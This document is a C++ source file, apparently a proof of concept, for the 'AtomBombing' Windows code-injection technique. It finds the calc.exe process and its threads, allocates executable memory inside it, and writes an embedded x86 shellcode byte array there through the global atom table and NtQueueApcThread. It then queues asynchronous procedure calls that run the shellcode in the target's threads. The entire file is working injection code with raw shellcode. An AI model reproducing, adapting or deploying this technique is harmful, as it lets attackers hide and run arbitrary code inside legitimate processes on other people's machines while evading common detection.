/**
 *	@file: AtomBomboing.cpp
 *	@author: aaaddress1@chroot.org
 *	@date:	2017/8/11
**/
#include <windows.h>
#include <TlHelp32.h>
#include <vector>
#include <winternl.h>


typedef ULONG(WINAPI* _NtQueueApcThread)(HANDLE ThreadHandle,
	PAPCFUNC ApcRoutine,
	PVOID NormalContext,
	PVOID SystemArgument1,
	PVOID SystemArgument2
	);

using std::vector;
vector<DWORD> tids;
bool FindProcess(PCWSTR exeName, DWORD& pid, vector<DWORD>& tids) {
	auto hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return false;
	pid = 0;
	PROCESSENTRY32 pe = { sizeof(pe) };
	if (::Process32First(hSnapshot, &pe)) {
		do {
			if (_wcsicmp(pe.szExeFile, exeName) == 0) {
				pid = pe.th32ProcessID;
				THREADENTRY32 te = { sizeof(te) };
				if (::Thread32First(hSnapshot, &te)) {
					do {
						if (te.th32OwnerProcessID == pid) {
							tids.push_back(te.th32ThreadID);
						}
					} while (::Thread32Next(hSnapshot, &te));
				}
				break;
			}
		} while (::Process32Next(hSnapshot, &pe));
	}
	::CloseHandle(hSnapshot);
	return pid > 0 && !tids.empty();
}

PVOID atomWriteProcessMemory(HANDLE hProcess, char *data, int size)
{
	LoadLibraryA("USER32.dll");

	_NtQueueApcThread NtQueueApcThread = (_NtQueueApcThread)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueueApcThread");
	PAPCFUNC GlobalGetAtomNameW_ptr = (PAPCFUNC)GetProcAddress(LoadLibraryA("kernel32.dll"), "GlobalGetAtomNameW");

	PVOID p = ::VirtualAllocEx(hProcess, nullptr, size + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("allocated memory at %p\n", p);

	for (int i = 0; i < size;) {
		ATOM atom = GlobalAddAtomW((LPCWSTR)(data + i));
		for (const auto& tid : tids)
		{
			HANDLE hThread = ::OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
			if (hThread)
			{
				NtQueueApcThread(hThread, GlobalGetAtomNameW_ptr, (PVOID)((int)atom), (PVOID)((LONG)p + i), (PVOID)255);
				WaitForSingleObject(hThread, INFINITE);
			}
		}
		i += 255;
	}
	return p;
}

void main()
{
	LoadLibraryA("USER32.dll");

	_NtQueueApcThread NtQueueApcThread = (_NtQueueApcThread)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueueApcThread");
	DWORD pid;
	if (FindProcess(L"calc.exe", pid, tids))
	{
		HANDLE hProcess = ::OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);

		char shellcode[] = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
			"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
			"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
			"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
			"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
			"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"
			"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"
			"\x49\x0b\x31\xc0\x51\x50\xff\xd7";

		PVOID remote_shellcode_ptr = atomWriteProcessMemory(hProcess, shellcode, strlen(shellcode));
		for (const auto& tid : tids)
		{
			HANDLE hThread = ::OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
			if (hThread)
			{
				NtQueueApcThread(hThread, (PAPCFUNC)remote_shellcode_ptr, NULL, NULL, NULL);
				WaitForSingleObject(hThread, INFINITE);
			}
		}
		system("PAUSE");
	}
}